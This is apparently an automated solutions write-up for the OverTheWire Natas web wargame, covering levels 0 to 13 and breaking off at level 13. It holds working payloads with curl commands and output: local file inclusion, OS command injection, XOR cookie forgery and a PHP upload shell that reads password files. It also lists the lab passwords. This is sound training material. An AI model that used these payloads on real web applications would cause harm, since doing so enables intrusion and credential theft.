# OverTheWire Natas — Solutions

Every level solved live against `*.natas.labs.overthewire.org` in this run. Natas levels are
web challenges behind HTTP Basic auth: each level's password is the credential for the next
(`natas<n>` / password). For each level: the goal, the technique and why it works, the exact
commands (curl/HTTP requests), and how the password was verified. Recordings are in
`recordings/natas/L<n>.cast`.

Verification rule used throughout: a password is accepted only if a request to
`natas<next>.natas.labs.overthewire.org` with it returns that level's page (HTTP 200).
---
## Level 0 → natas1
- **Account:** `natas0`, password `natas0` (given by the game).
- **Goal:** The password for natas1 is somewhere on the level-0 page.
- **Technique and why it works:** HTTP Basic auth protects the page; the game hands us natas0's credential. The password is not in the visible body but in an HTML comment: `<!--The password for natas1 is ... -->`. Comments are sent to the browser like any other markup, so fetching the raw page (rather than viewing rendered text) exposes them. `curl -u user:pass` sends the Basic auth header and prints the raw response; `grep` picks out the comment line.
- **Commands:**
  ```
  curl -s -u natas0:natas0 http://natas0.natas.labs.overthewire.org/ | grep "natas1 is"
  ```
### Step-by-step discovery and crafting (what the recording shows)
1. **Start with the credential the game gives us.** The level page says the password for natas1 is on this page. Every natas level is behind HTTP Basic auth, so the first thing to establish is how to talk to it non-interactively: `curl -u natas0:natas0 URL` sends the `Authorization: Basic ...` header for us.
2. **Fetch the page and look at the raw response, not the rendered text.** A browser hides comments; curl does not:
   ```
   curl -s -u natas0:natas0 http://natas0.natas.labs.overthewire.org/
   ```
   The `-s` flag matters: it silences curl's progress meter so the output is only the server's response, which is what makes it pipeable.
3. **Search instead of eyeballing.** The page is small, but the habit generalises: pipe the response into `grep` for the thing the level asks for.
   ```
   curl -s -u natas0:natas0 http://natas0.natas.labs.overthewire.org/ | grep "natas1 is"
   <!--The password for natas1 is scfWG6qNEIdzqVyfRwEGXyNUfFZkZeQ7 -->
   ```
   The match is inside an HTML comment — still part of the response body, so it is served to anyone who asks.
4. **Verify before recording the password.** Fetch the *next* level with the new credential and check it returns that level's page rather than a 401:
   ```
   curl -s -o /dev/null -w '%{http_code}\n' -u natas1:scfWG6qNEIdzqVyfRwEGXyNUfFZkZeQ7 http://natas1.natas.labs.overthewire.org/
   # 200
   ```
- **Password for natas1:** `scfWG6qNEIdzqVyfRwEGXyNUfFZkZeQ7`
- **Verification:** fetched `http://natas1.natas.labs.overthewire.org/` with `natas1:<password>` and got the level-1 page (HTTP 200 with natas1 content), which also displays the same password in its wechall info.
- **Recording:** `recordings/natas/L0.cast`

## Level 1 → natas2
- **Account:** `natas1`.
- **Goal:** The password for natas2 is on the level-1 page, but right-clicking is blocked by the page's `oncontextmenu` handler.
- **Technique and why it works:** The right-click block is a client-side JavaScript attribute on `<body>` — it only affects a browser's context menu, not the data. The password is in an HTML comment (`<!--The password for natas2 is ... -->`), and comments are part of the raw response, so fetching the page with curl and grepping the comment line retrieves it without needing a browser or defeating any server-side control.
- **Commands:**
  ```
  curl -s -u natas1:<pw> http://natas1.natas.labs.overthewire.org/ | grep "natas2 is"
  ```
### Step-by-step discovery and crafting (what the recording shows)
1. **Log in with the password from level 0.** `curl -u natas1:<pw>` — the level's own page confirms the credential works.
2. **Note what the page claims to block.** The `<body>` tag carries
   ```
   oncontextmenu="javascript:alert('right clicking has been blocked!');return false;"
   ```
   This is a client-side JavaScript handler. It runs only in a browser, and it only affects the context menu. It has no bearing on what the server sends.
3. **Fetch the raw body anyway.** `curl` never executes JavaScript, so the handler is inert:
   ```
   curl -s -u natas1:scfWG6qNEIdzqVyfRwEGXyNUfFZkZeQ7 http://natas1.natas.labs.overthewire.org/
   ```
   The response contains the level content plus the comment with the next password.
4. **Extract the line.** The same grep pattern as level 0 works because the page format is identical:
   ```
   curl -s -u natas1:<pw> http://natas1.natas.labs.overthewire.org/ | grep "natas2 is"
   <!--The password for natas2 is vsDOxoXyq3wckCP1ZmTZ71ngIA606odB -->
   ```
   The lesson: a client-side restriction is not a security control; the data is already in the response.
5. **Verify.** `curl -u natas2:vsDOxoXyq3wckCP1ZmTZ71ngIA606odB http://natas2.natas.labs.overthewire.org/` → the level-2 page (HTTP 200).
- **Password for natas2:** `vsDOxoXyq3wckCP1ZmTZ71ngIA606odB`
- **Verification:** fetched `http://natas2.natas.labs.overthewire.org/` with `natas2:<password>` → HTTP 200 with the level-2 page.
- **Recording:** `recordings/natas/L1.cast`

## Level 2 → natas3
- **Account:** `natas2`.
- **Goal:** The page only shows a 1-pixel image; the password is elsewhere on the site.
- **Technique and why it works:** The `<img src="files/pixel.png">` reveals a `files/` directory. The web server has directory indexing enabled for that directory, so requesting `files/` returns an Apache index listing, which shows `users.txt` next to `pixel.png`. That file is a plain credentials list and includes the line `natas3:<password>`. The bug is a combination of an unlinked-but-guessable directory and an open index, not a code flaw.
- **Commands:**
  ```
  curl -s -u natas2:<pw> http://natas2.natas.labs.overthewire.org/ | grep img
  curl -s -u natas2:<pw> http://natas2.natas.labs.overthewire.org/files/
  curl -s -u natas2:<pw> http://natas2.natas.labs.overthewire.org/files/users.txt
  ```
### Step-by-step discovery and crafting (what the recording shows)
1. **Read the page.** The visible content is almost nothing: one image tag.
   ```
   curl -s -u natas2:<pw> http://natas2.natas.labs.overthewire.org/ | grep img
   <img src="files/pixel.png">
   ```
   The `src` gives us a directory name (`files/`) that the page never links to.
2. **Try the directory itself.** Servers with Apache's `Indexes` option render a listing for a directory request:
   ```
   curl -s -u natas2:<pw> http://natas2.natas.labs.overthewire.org/files/
   ```
   The HTML lists `pixel.png` and, next to it, **`users.txt`**. Piping the listing through `grep -o 'href="[^"]*"'` (as the recording does) shows the entries without the surrounding markup.
3. **Fetch the interesting file.** It is a plain credentials list:
   ```
   curl -s -u natas2:<pw> http://natas2.natas.labs.overthewire.org/files/users.txt
   # username:password
   # alice:BYNdCesZqW
   # bob:jw2ueICLvT
   # ...
   # natas3:K30JrSRHzjxq3paUQuwozY4MNvmNFyhI
   ```
   The target line is the `natas3:` entry.
4. **Verify.** `curl -u natas3:K30JrSRHzjxq3paUQuwozY4MNvmNFyhI http://natas3.natas.labs.overthewire.org/` → HTTP 200.
- **Password for natas3:** `K30JrSRHzjxq3paUQuwozY4MNvmNFyhI`
- **Verification:** fetched `http://natas3.natas.labs.overthewire.org/` with `natas3:<password>` → HTTP 200.
- **Recording:** `recordings/natas/L2.cast`

## Level 3 → natas4
- **Account:** `natas3`.
- **Goal:** The page says "There is nothing on this page" and the comment says not even Google will find it. Find the password for natas4.
- **Technique and why it works:** The hint points at search-engine indexing, so we read `robots.txt`, which lists `Disallow: /s3cr3t/`. robots.txt is a public file that *reveals* paths rather than hiding them; it only asks well-behaved crawlers to stay out. That directory has Apache directory indexing enabled, so `s3cr3t/` lists `users.txt`, which contains `natas4:<password>`.
- **Commands:**
  ```
  curl -s -u natas3:<pw> http://natas3.natas.labs.overthewire.org/robots.txt
  curl -s -u natas3:<pw> http://natas3.natas.labs.overthewire.org/s3cr3t/
  curl -s -u natas3:<pw> http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
  ```
### Step-by-step discovery and crafting (what the recording shows)
1. **Read the page and its comment.** The body says "There is nothing on this page"; the comment adds that not even Google will find it. That wording is a deliberate hint about crawler rules.
2. **Go to `robots.txt`.** It is the file crawlers are told to read, and it is served publicly:
   ```
   curl -s -u natas3:<pw> http://natas3.natas.labs.overthewire.org/robots.txt
   User-agent: *
   Disallow: /s3cr3t/
   ```
   The `Disallow` line *names* the directory — it hides the path from crawlers by telling everyone where it is. This is the discovery step: robots.txt is a map, not a lock.
3. **Request the disclosed directory.**
   ```
   curl -s -u natas3:<pw> http://natas3.natas.labs.overthewire.org/s3cr3t/
   ```
   Index listing enabled again → `users.txt`.
4. **Fetch it.**
   ```
   curl -s -u natas3:<pw> http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
   natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth
   ```
5. **Verify.** `curl -u natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth http://natas4.natas.labs.overthewire.org/` → HTTP 200.
- **Password for natas4:** `JDrPnuZAKyl6MkiqQGFIddrqpvgOASth`
- **Verification:** `http://natas4.natas.labs.overthewire.org/` with `natas4:<password>` → HTTP 200.
- **Recording:** `recordings/natas/L3.cast`

## Level 4 → natas5
- **Account:** `natas4`.
- **Goal:** The page refuses access unless you arrive from `http://natas5.natas.labs.overthewire.org/`.
- **Technique and why it works:** The check is on the HTTP `Referer` header, which the *client* supplies. It is not a security boundary — it is trivially spoofed with `curl -H 'Referer: ...'`. We send the header claiming we came from natas5, and the server grants access and prints natas5's password. The lesson: client-controlled headers cannot be trusted for access control.
- **Commands:**
  ```
  curl -s -u natas4:<pw> -H 'Referer: http://natas5.natas.labs.overthewire.org/' http://natas4.natas.labs.overthewire.org/
  ```
### Step-by-step discovery and crafting (what the recording shows)
1. **See the rejection message.** Fetching the page plainly gives:
   ```
   curl -s -u natas4:<pw> http://natas4.natas.labs.overthewire.org/
   Access disallowed. You are visiting from "" while authorized users should come only from
   "http://natas5.natas.labs.overthewire.org/"
   ```
   The empty quotes show the server saw **no** referrer at all — that is our first clue that it is reading the `Referer` header.
2. **Understand what `Referer` is.** It is a header the *browser* sends to say which page linked to this one. The server only reads it; it cannot verify it. curl lets us set any header with `-H`.
3. **Send the expected referrer.**
   ```
   curl -s -u natas4:<pw> -H 'Referer: http://natas5.natas.labs.overthewire.org/' http://natas4.natas.labs.overthewire.org/
   Access granted. The password for natas5 is e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M
   ```
   The check is satisfied by a value we chose, so it is not an access control at all.
4. **Verify.** `curl -u natas5:e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M http://natas5.natas.labs.overthewire.org/` → HTTP 200.
- **Password for natas5:** `e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M`
- **Verification:** `http://natas5.natas.labs.overthewire.org/` with `natas5:<password>` → HTTP 200.
- **Recording:** `recordings/natas/L4.cast`

## Level 5 → natas6
- **Account:** `natas5`.
- **Goal:** The page says "You are not logged in." Log in.
- **Technique and why it works:** The server sets a cookie `loggedin=0` and decides access from that cookie's value. Cookies are stored client-side, so we can set `loggedin=1` ourselves with `curl -b`. The server trusts the cookie without a server-side session or signature, so it accepts the forged value and prints natas6's password.
- **Commands:**
  ```
  curl -sI -u natas5:<pw> http://natas5.natas.labs.overthewire.org/ | grep -i set-cookie   # loggedin=0
  curl -s -u natas5:<pw> -b 'loggedin=1' http://natas5.natas.labs.overthewire.org/
  ```
### Step-by-step discovery and crafting (what the recording shows)
1. **Fetch the page.** It says "You are not logged in." Nothing in the body says how login is represented.
2. **Inspect the response headers.** `-I` asks curl for the headers only (`HEAD` request), and `-o /dev/null` discards any body:
   ```
   curl -sI -u natas5:<pw> http://natas5.natas.labs.overthewire.org/ | grep -i set-cookie
   Set-Cookie: loggedin=0
   ```
   The server's idea of "logged in" is a single client-side cookie with a boolean value.
3. **Forge it.** `-b 'loggedin=1'` sends a cookie with that exact name and value:
   ```
   curl -s -u natas5:<pw> -b 'loggedin=1' http://natas5.natas.labs.overthewire.org/
   Access granted. The password for natas6 is 7mhjtShJAcld2NYbKHEadnhEwRn2P8VT
   ```
   Because the server stores no session state of its own, the value in our request *is* the truth as far as it is concerned.
4. **Verify.** `curl -u natas6:7mhjtShJAcld2NYbKHEadnhEwRn2P8VT http://natas6.natas.labs.overthewire.org/` → HTTP 200.
- **Password for natas6:** `7mhjtShJAcld2NYbKHEadnhEwRn2P8VT`
- **Verification:** `http://natas6.natas.labs.overthewire.org/` with `natas6:<password>` → HTTP 200.
- **Recording:** `recordings/natas/L5.cast`

## Level 6 → natas7
- **Account:** `natas6`.
- **Goal:** Submit the correct "secret" to the form to get natas7's password.
- **Technique and why it works:** The page exposes its source (`index-source.html`), which shows the form compares `$_POST['secret']` with `$secret`, loaded by `include "includes/secret.inc"`. The include file is directly fetchable from the web root, so requesting `includes/secret.inc` reveals `$secret = "FOEIUWGHFEEUHOFUOIU"`. Posting that value passes the comparison and prints the next password. The bug is that a PHP include is served as plain text over HTTP.
- **Commands:**
  ```
  curl -s -u natas6:<pw> http://natas6.natas.labs.overthewire.org/index-source.html
  curl -s -u natas6:<pw> http://natas6.natas.labs.overthewire.org/includes/secret.inc
  curl -s -u natas6:<pw> -d 'secret=FOEIUWGHFEEUHOFUOIU&submit=1' http://natas6.natas.labs.overthewire.org/
  ```
### Step-by-step discovery and crafting (what the recording shows)
1. **Read the page source.** The level links `index-source.html`, which is the PHP source with the HTML entities escaped. It shows the comparison and, crucially, where `$secret` comes from:
   ```
   curl -s -u natas6:<pw> http://natas6.natas.labs.overthewire.org/index-source.html
   # include "includes/secret.inc";
   # if(array_key_exists("secret", $_POST) and $_POST["secret"] == $secret) { ... }
   ```
   Grepping the source for `includes/secret.inc` gives us the path directly.
2. **Fetch the include over HTTP.** An `include`d `.inc` file is not protected by the PHP engine — the web server serves it as a static file:
   ```
   curl -s -u natas6:<pw> http://natas6.natas.labs.overthewire.org/includes/secret.inc
   <?
   $secret = "FOEIUWGHFEEUHOFUOIU";
   ?>
   ```
   Now we know the literal the form compares against.
3. **Submit it.** The form is a POST; `-d` sends `application/x-www-form-urlencoded` data:
   ```
   curl -s -u natas6:<pw> -d 'secret=FOEIUWGHFEEUHOFUOIU&submit=1' http://natas6.natas.labs.overthewire.org/
   Access granted. The password for natas7 is B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0
   ```
4. **Verify.** `curl -u natas7:B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0 http://natas7.natas.labs.overthewire.org/` → HTTP 200.
- **Password for natas7:** `B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0`
- **Verification:** `http://natas7.natas.labs.overthewire.org/` with `natas7:<password>` → HTTP 200.
- **Recording:** `recordings/natas/L6.cast`

## Level 7 → natas8
- **Account:** `natas7`.
- **Goal:** The page's hint comment says the password for natas8 is in `/etc/natas_webpass/natas8`; the page links to `index.php?page=home` and `index.php?page=about`.
- **Technique and why it works:** The `page` parameter is used to include a file without validation — a local file inclusion / path traversal. Passing an absolute path (`page=/etc/natas_webpass/natas8`) makes PHP read that file and print it into the page, giving us the password. There is no need for `../` because the parameter accepts absolute paths directly.
- **Commands:**
  ```
  curl -s -u natas7:<pw> 'http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8'
  ```
### Step-by-step discovery and crafting (what the recording shows)
1. **Read the page and the comment.** The links are `index.php?page=home` and `index.php?page=about`, and the HTML comment states the goal explicitly:
   ```
   curl -s -u natas7:<pw> http://natas7.natas.labs.overthewire.org/ | grep -o 'hint:.*'
   hint: password for webuser natas8 is in /etc/natas_webpass/natas8
   ```
2. **Infer the mechanism from the URL shape.** `?page=<name>` that selects content is almost always `include($_GET['page'])`. The value is used as a path, not validated against a list of allowed pages.
3. **Substitute an absolute path.** No `../` is needed: the include accepts an absolute path directly, and PHP prints the file's contents into the page:
   ```
   curl -s -u natas7:<pw> 'http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8'
   ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc
   ```
   The recording trims the surrounding `<br>`/comment markup with `sed` so the password stands alone.
4. **Verify.** `curl -u natas8:ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc http://natas8.natas.labs.overthewire.org/` → HTTP 200.
- **Password for natas8:** `ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc`
- **Verification:** `http://natas8.natas.labs.overthewire.org/` with `natas8:<password>` → HTTP 200.
- **Recording:** `recordings/natas/L7.cast`

## Level 8 → natas9
- **Account:** `natas8`.
- **Goal:** Submit the correct secret; the source shows the check is `encodeSecret($_POST['secret']) == "3d3d516343746d4d6d6c315669563362"`.
- **Technique and why it works:** `encodeSecret` is `bin2hex(strrev(base64_encode($secret)))`. To invert it, undo the operations in reverse order: hex-decode, reverse the string, then base64-decode. Hex-decoding yields `==QcCtmMml1ViV3b`; reversing yields `b3ViV1lmMmtCcQ==`; base64-decoding yields `oubWYf2kBq`. Posting that value satisfies the comparison and returns natas9's password. This is obfuscation, not hashing — every step is reversible.
- **Commands:**
  ```
  curl -s -u natas8:<pw> http://natas8.natas.labs.overthewire.org/index-source.html
  python3 -c "import base64; h='3d3d516343746d4d6d6c315669563362'; s=bytes.fromhex(h).decode()[::-1]; print(base64.b64decode(s).decode())"
  curl -s -u natas8:<pw> -d 'secret=oubWYf2kBq&submit=1' http://natas8.natas.labs.overthewire.org/
  ```
### Step-by-step discovery and crafting (what the recording shows)
1. **Read the source.** `index-source.html` shows the comparison and the encoder:
   ```
   curl -s -u natas8:<pw> http://natas8.natas.labs.overthewire.org/index-source.html | grep -o 'encodedSecret&nbsp;=&nbsp;"[0-9a-f]*"'
   encodedSecret&nbsp;=&nbsp;"3d3d516343746d4d6d6c315669563362"
   ```
   and
   ```
   function encodeSecret($secret) {
       return bin2hex(strrev(base64_encode($secret)));
   }
   ```
2. **Invert the pipeline, last operation first.** The encoder is base64 → reverse → hex. To undo it: hex-decode → reverse → base64-decode.
   ```
   python3 -c "import base64;h='3d3d516343746d4d6d6c315669563362';s=bytes.fromhex(h).decode()[::-1];print(base64.b64decode(s).decode())"
   # oubWYf2kBq
   ```
   Each intermediate value can be checked by eye: `3d3d51...` hex-decodes to `==QcCtmMml1ViV3b`, reversing gives `b3ViV1lmMmtCcQ==` (a valid base64 string ending in `==`), and base64-decoding gives the secret.
3. **Submit the recovered secret.**
   ```
   curl -s -u natas8:<pw> -d 'secret=oubWYf2kBq&submit=1' http://natas8.natas.labs.overthewire.org/
   Access granted. The password for natas9 is UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9
   ```
4. **Verify.** `curl -u natas9:UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9 http://natas9.natas.labs.overthewire.org/` → HTTP 200.
- **Password for natas9:** `UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9`
- **Verification:** `http://natas9.natas.labs.overthewire.org/` with `natas9:<password>` → HTTP 200.
- **Recording:** `recordings/natas/L8.cast`

## Level 9 → natas10
- **Account:** `natas9`.
- **Goal:** The form takes a search term and runs `passthru("grep -i $key dictionary.txt")`. Use it to read natas10's password.
- **Technique and why it works:** `$key` is interpolated straight into a shell command, so shell metacharacters in the input are executed by `sh`. Sending `; cat /etc/natas_webpass/natas10 #` terminates the grep command and runs `cat` on the password file; the trailing `#` comments out the remaining ` dictionary.txt`. The output of both commands is printed. This is classic OS command injection: user input reaching `passthru` unescaped.
- **Commands:**
  ```
  curl -s -u natas9:<pw> --data-urlencode 'needle=; cat /etc/natas_webpass/natas10 #' http://natas9.natas.labs.overthewire.org/
  ```
### Step-by-step discovery and crafting (what the recording shows)
1. **Read the source.** The level exposes `index-source.html`; the relevant line is
   ```
   curl -s -u natas9:<pw> http://natas9.natas.labs.overthewire.org/index-source.html | sed 's/<[^>]*>//g' | tr -d '\n' | grep -o 'passthru([^)]*)'
   passthru("grep -i $key dictionary.txt");
   ```
   `$key` comes straight from the form and is interpolated into a shell command with no quoting and no escaping.
2. **Recognise the sink.** `passthru` runs the string through `/bin/sh` and prints the raw output. Any shell metacharacter in `$key` is therefore executed by the shell — this is OS command injection, not a grep problem.
3. **Craft the payload.** The command already has `dictionary.txt` after `$key`, so the injection must terminate the grep first and neutralise the trailing argument. `;` starts a new command; `#` comments out the rest:
   ```
   needle = ; cat /etc/natas_webpass/natas10 #
   ```
   The resulting shell line is `grep -i ; cat /etc/natas_webpass/natas10 # dictionary.txt` — grep runs (and errors, harmlessly), then cat prints the password file, and the trailing filename is commented out.
4. **Send it with `--data-urlencode`.** The payload contains spaces, `;` and `#`, all of which must be URL-encoded; letting curl encode the field avoids hand-building `%20`/`%3B`/`%23`:
   ```
   curl -s -u natas9:<pw> --data-urlencode 'needle=; cat /etc/natas_webpass/natas10 #' http://natas9.natas.labs.overthewire.org/
   ```
   The `<pre>` block in the response contains the password (the recording strips the tags with `sed`).
5. **Verify.** `curl -u natas10:EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv http://natas10.natas.labs.overthewire.org/` → HTTP 200.
- **Password for natas10:** `EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv`
- **Verification:** `http://natas10.natas.labs.overthewire.org/` with `natas10:<password>` → HTTP 200.
- **Recording:** `recordings/natas/L9.cast`

## Level 10 → natas11
- **Account:** `natas10`.
- **Goal:** Same `passthru("grep -i $key dictionary.txt")` construct, but `preg_match('/[;|&]/', $key)` now rejects `;`, `|`, and `&`.
- **Technique and why it works:** Blocking shell separators is not enough: the unquoted `$key` is still split by the shell, and grep itself takes multiple file arguments. We pass a pattern followed by a space and a path, `^ /etc/natas_webpass/natas11`. The shell builds `grep -i ^ /etc/natas_webpass/natas11 dictionary.txt`; grep treats `/etc/natas_webpass/natas11` as a second input file, and the `^` pattern matches every line of it, printing the password prefixed by the filename. No metacharacter is needed — argument injection suffices.
- **Commands:**
  ```
  curl -s -u natas10:<pw> --data-urlencode 'needle=^ /etc/natas_webpass/natas11' http://natas10.natas.labs.overthewire.org/
  ```
### Step-by-step discovery and crafting (what the recording shows)
1. **Read the source.** It is the same `passthru` construct plus a filter:
   ```
   curl -s -u natas10:<pw> http://natas10.natas.labs.overthewire.org/index-source.html | sed 's/<[^>]*>//g' | tr -d '\n' | grep -o 'preg_match([^)]*)'
   preg_match('/[;|&]/',$key)
   ```
   `;`, `|` and `&` are rejected, so the previous level's `; cat ...` payload is blocked.
2. **Notice what is *not* filtered.** The string is still interpolated unquoted into `grep -i $key dictionary.txt`, so the shell still splits `$key` into **words**. Word splitting is not a metacharacter, so the filter does not see it.
3. **Use grep's own argument handling.** `grep -i PATTERN FILE...` accepts multiple files. If we supply a pattern and then a path, the shell builds `grep -i <pattern> /etc/natas_webpass/natas11 dictionary.txt`: grep searches the password file *as well as* the dictionary. The pattern `^` matches every line, so the whole password file is printed.
   ```
   needle = ^ /etc/natas_webpass/natas11
   ```
   No shell metacharacter appears anywhere in the payload — it passes `preg_match` untouched.
4. **Send it.** `--data-urlencode` encodes the space:
   ```
   curl -s -u natas10:<pw> --data-urlencode 'needle=^ /etc/natas_webpass/natas11' http://natas10.natas.labs.overthewire.org/
   ```
   The `<pre>` output has the password prefixed by the filename, because grep labels matches when given more than one file.
5. **Verify.** `curl -u natas11:VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd http://natas11.natas.labs.overthewire.org/` → HTTP 200.
- **Password for natas11:** `VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd`
- **Verification:** `http://natas11.natas.labs.overthewire.org/` with `natas11:<password>` → HTTP 200.
- **Recording:** `recordings/natas/L10.cast`

## Level 11 → natas12
- **Account:** `natas11`.
- **Goal:** The page stores your background color in a cookie, base64-encoded and XOR-encrypted with a secret key; set `showpassword=yes` in that data to get natas12's password.
- **Technique and why it works:** The source shows `xor_encrypt` XORs each byte of the JSON with the repeating key, and `saveData` base64-encodes the result into the `data` cookie. We know the plaintext for the default cookie (`{"showpassword":"no","bgcolor":"#ffffff"}`), so XORing the decoded cookie with that plaintext recovers the key; it turns out to be the 4-byte key `kBSw` repeating. With the key we encrypt a new JSON object whose `showpassword` is `"yes"`, base64-encode it, and send it as the cookie. The server decrypts it, sees the flag, and prints natas12's password. XOR with a short repeating key and known plaintext is a classic keystream-recovery break.
- **Commands:**
  ```
  curl -s -D- -o /dev/null -u natas11:<pw> http://natas11.natas.labs.overthewire.org/ | grep -i set-cookie
  # python: decode cookie, XOR with known plaintext -> key b'kBSw'; forge cookie for showpassword=yes
  curl -s -u natas11:<pw> -b 'data=EGAgHwQ1IxYYMSQYGSZxTUk7NgRJbnEVDCE8GwQwcU1JYTURDSQ1EUk%2F' http://natas11.natas.labs.overthewire.org/
  ```
### Step-by-step discovery and crafting (what the recording shows)
1. **Read the source.** It shows the cookie format and the crypto:
   ```
   function xor_encrypt($in) {
       $key = '<censored>'; $text = $in; $outText = '';
       for($i=0;$i<strlen($text);$i++) $outText .= $text[$i] ^ $key[$i % strlen($key)];
       return $outText;
   }
   function saveData($d) { setcookie("data", base64_encode(xor_encrypt(json_encode($d)))); }
   ```
   So the `data` cookie is `base64(JSON XOR repeating-key)`.
2. **Get a sample cookie.** `-D-` prints response headers, `-o /dev/null` discards the body:
   ```
   curl -s -D- -o /dev/null -u natas11:<pw> http://natas11.natas.labs.overthewire.org/ | grep -i set-cookie
   Set-Cookie: data=EGAgHwQ1IxYYMSQYGSZxTUksPFVHYDEQCC0%2FGBlgaVVIJDURDSQ1VRY%3D
   ```
3. **Recover the key from known plaintext.** The default object is `{"showpassword":"no","bgcolor":"#ffffff"}` — we know it exactly. XOR is its own inverse, so XORing the decoded cookie with that plaintext gives the keystream; because the key repeats, the first four bytes reveal it:
   ```
   python3 - <<'PY'
   import base64, urllib.parse
   ct = base64.b64decode(urllib.parse.unquote('EGAgHwQ1IxYYMSQYGSZxTUksPFVHYDEQCC0%2FGBlgaVVIJDURDSQ1VRY%3D'))
   pt = b'{"showpassword":"no","bgcolor":"#ffffff"}'
   print(bytes(a ^ b for a, b in zip(pt, ct))[:4])
   PY
   # b'kBSw'
   ```
   The recording prints `recovered key: b'kBSw'`. (The trailing bytes of the plaintext/ciphertext pair are shorter than the JSON; only the first key period is needed.)
4. **Forge the new cookie.** Encrypt `{"showpassword":"yes","bgcolor":"#ffffff"}` with the recovered key, base64-encode, and URL-encode it for the header:
   ```
   python3 - <<'PY'
   import base64, urllib.parse, json
   key = b'kBSw'
   want = json.dumps({"showpassword":"yes","bgcolor":"#ffffff"}, separators=(',',':')).encode()
   enc = bytes(want[i] ^ key[i % len(key)] for i in range(len(want)))
   print(urllib.parse.quote(base64.b64encode(enc).decode(), safe=''))
   PY
   ```
   The printed value is the `data=` value the recording sends.
5. **Send the forged cookie and read the flag.**
   ```
   curl -s -u natas11:<pw> -b 'data=EGAgHwQ1IxYYMSQYGSZxTUk7NgRJbnEVDCE8GwQwcU1JYTURDSQ1EUk%2F' http://natas11.natas.labs.overthewire.org/ | grep -i "password for natas12"
   ```
   The server decrypts, sees `showpassword=yes`, and prints the next password.
6. **Verify.** `curl -u natas12:EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng http://natas12.natas.labs.overthewire.org/` → HTTP 200.
- **Password for natas12:** `EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng`
- **Verification:** `http://natas12.natas.labs.overthewire.org/` with `natas12:<password>` → HTTP 200.
- **Recording:** `recordings/natas/L11.cast`

## Level 12 → natas13
- **Account:** `natas12`.
- **Goal:** Upload a JPEG (max 1 KB) and retrieve natas13's password.
- **Technique and why it works:** The upload handler builds the stored path from the client-supplied `filename` POST field: `makeRandomPathFromFilename("upload", $_POST["filename"])` takes the extension from that field, so the random prefix does not matter. By sending `filename=shell.php`, the uploaded bytes are stored as `upload/<random>.php` and are executed as PHP by the server. There is no content-type or image validation in this level. The PHP payload prints the contents of `/etc/natas_webpass/natas13`; requesting the returned upload URL executes it and returns the password. This is an unrestricted file upload → remote code execution.
- **Commands:**
  ```
  printf '<?php echo file_get_contents("/etc/natas_webpass/natas13"); ?>' > /tmp/shell.php
  curl -s -u natas12:<pw> -F 'filename=shell.php' -F 'uploadedfile=@/tmp/shell.php;type=image/jpeg' http://natas12.natas.labs.overthewire.org/index.php
  curl -s -u natas12:<pw> http://natas12.natas.labs.overthewire.org/upload/<random>.php
  ```
### Step-by-step discovery and crafting (what the recording shows)
1. **Read the source.** The upload handler shows where the stored filename comes from:
   ```
   curl -s -u natas12:<pw> http://natas12.natas.labs.overthewire.org/index-source.html | sed 's/<[^>]*>//g' | tr -d '\n' | grep -o 'makeRandomPathFromFilename[^)]*)'
   makeRandomPathFromFilename("upload", $_POST["filename"])
   ```
   The random prefix is generated server-side, but the **extension is taken from the client-supplied `filename` POST field**.
2. **Write a PHP payload.** The payload prints the next password file; `printf` (not `echo`) avoids shell interpretation of `$`:
   ```
   printf '<?php echo file_get_contents("/etc/natas_webpass/natas13"); ?>' > /tmp/shell.php
   ls -l /tmp/shell.php
   ```
3. **Upload it with a `.php` name.** `-F` builds a multipart request: `filename=shell.php` sets the POST field the handler trusts for the extension, and `uploadedfile=@...` attaches the file. The `;type=image/jpeg` only sets the part's content type — the server does not check it at this level:
   ```
   curl -s -u natas12:<pw> -F 'filename=shell.php' -F 'uploadedfile=@/tmp/shell.php;type=image/jpeg' http://natas12.natas.labs.overthewire.org/index.php
   ```
   The response contains the stored path, e.g. `upload/t7fve9ekok.php`; the recording extracts it with `grep -o 'upload/[a-z0-9]*\.php'`.
4. **Request the uploaded file.** The web server executes `.php` files, so the code runs with the web server's privileges and prints the password:
   ```
   curl -s -u natas12:<pw> http://natas12.natas.labs.overthewire.org/upload/t7fve9ekok.php
   ```
5. **Verify.** `curl -u natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k http://natas13.natas.labs.overthewire.org/` → HTTP 200.
- **Password for natas13:** `g8ba0olAzaSJuyS4gnmbdVVigAICLG1k`
- **Verification:** `http://natas13.natas.labs.overthewire.org/` with `natas13:<password>` → HTTP 200.
- **Recording:** `recordings/natas/L12.cast`

## Level 13 → natas14
- **Account:** `natas13`.
- **Goal:** Same upload task as level 12, but the handler now validates the upload with `exif_imagetype($_FILES['uploadedfile']['tmp_name'])`.
- **Technique and why it works:** `exif_imagetype` only inspects the file's magic bytes to decide whether it looks like an image; it does not require the whole file to be a valid image, and it does not check the extension. Prepending the six-byte GIF header `GIF89a` makes the file pass the check, while the rest of the file is still PHP code. We send `filename=shell.php` as before so it is stored with a `.php` extension and executed, and the PHP prints `/etc/natas_webpass/natas14`. The lesson: content sniffing on a prefix is bypassable with a polyglot file, and the extension must be enforced separately.
- **Commands:**
  ```
  printf 'GIF89a' > /tmp/shell13.php
